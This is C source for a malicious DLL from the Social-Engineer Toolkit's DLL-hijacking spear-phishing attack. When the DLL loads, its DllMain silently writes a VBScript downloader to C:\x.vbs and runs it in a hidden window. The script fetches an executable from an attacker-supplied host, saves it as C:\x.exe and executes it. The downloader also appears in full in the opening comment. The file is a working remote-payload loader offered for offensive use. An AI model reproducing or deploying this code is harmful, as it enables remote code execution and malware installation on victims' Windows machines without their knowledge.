/*

DLL Hijacker Attack Written by Dave Kennedy (ReL1K) for the 
Social-Engineer Toolkit (SET) spear-phishing attack vector.

This is an ugly cscript downloader, it works on all platforms but
will rewrite in C later instead of cscript.

strFileURL = "http://IPADDRHERE/x"
strHDLocation = "C:\x.exe"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strFileURL, false
objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1
objADOStream.Write 
objXMLHTTP.ResponseBody
objADOStream.Position = 0
Set objFSO = Createobject("Scripting.FileSystemObject")
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
objADOStream.Close
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "c:\x.exe"

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>



int run()
{
   
     FILE *file;
     char* command = "cmd /c cscript c:\\x.vbs"; // execute the vbs script after fopen write
     char* host = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; // in SET does a replace of the length of IP address then terminates with a null byte to remove the rest of the X's
     file = fopen("C:\\x.vbs", "w"); // write file x.vbs
     fprintf(file,"strFileURL = \"http://%s/x\"\nstrHDLocation = \"C:\\x.exe\"\nSet objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")\nobjXMLHTTP.open \"GET\", strFileURL, false\nobjXMLHTTP.send()\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject(\"ADODB.Stream\")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = Createobject(\"Scripting.FileSystemObject\")\nIf objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation\nSet objFSO = Nothing\nobjADOStream.SaveToFile strHDLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.Run \"c:\\x.exe\"", host); // write the downloader file, this will grab an executable
     fclose(file); // close the file
     
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    si.dwFlags	= STARTF_USESHOWWINDOW;
    si.wShowWindow	= SW_HIDE; // hide the window
    
    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        command,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    sleep(5);
     
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  run();
  return 0;
}

